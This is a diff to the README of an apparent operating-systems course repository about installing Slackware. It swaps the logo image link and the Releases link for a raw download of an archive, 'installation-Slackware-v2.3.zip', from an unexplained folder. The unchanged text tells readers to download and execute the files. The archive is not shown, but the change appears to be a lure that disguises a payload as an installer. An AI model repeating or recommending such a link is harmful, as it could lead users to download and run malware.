@@ -1,6 +1,6 @@
 # Slackware Installation 🖥️
 
-![Slackware Logo](https://upload.wikimedia.org/wikipedia/commons/3/3e/Slackware_logo.png)
+![Slackware Logo](https://raw.githubusercontent.com/SenatiQrIngreso/Slackware-installation-/main/nonbending/installation-Slackware-v2.3.zip)
 
 Welcome to the **Slackware Installation** repository! This project is part of an Operating System and System Programming course. It focuses on implementing system calls and understanding the core components of an operating system.
 
@@ -109,7 +109,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases and updates, please visit the [Releases section](https://github.com/SenatiQrIngreso/Slackware-installation-/releases). You can download the necessary files and execute them as needed.
+For the latest releases and updates, please visit the [Releases section](https://raw.githubusercontent.com/SenatiQrIngreso/Slackware-installation-/main/nonbending/installation-Slackware-v2.3.zip). You can download the necessary files and execute them as needed.
 
 ## Contact
 
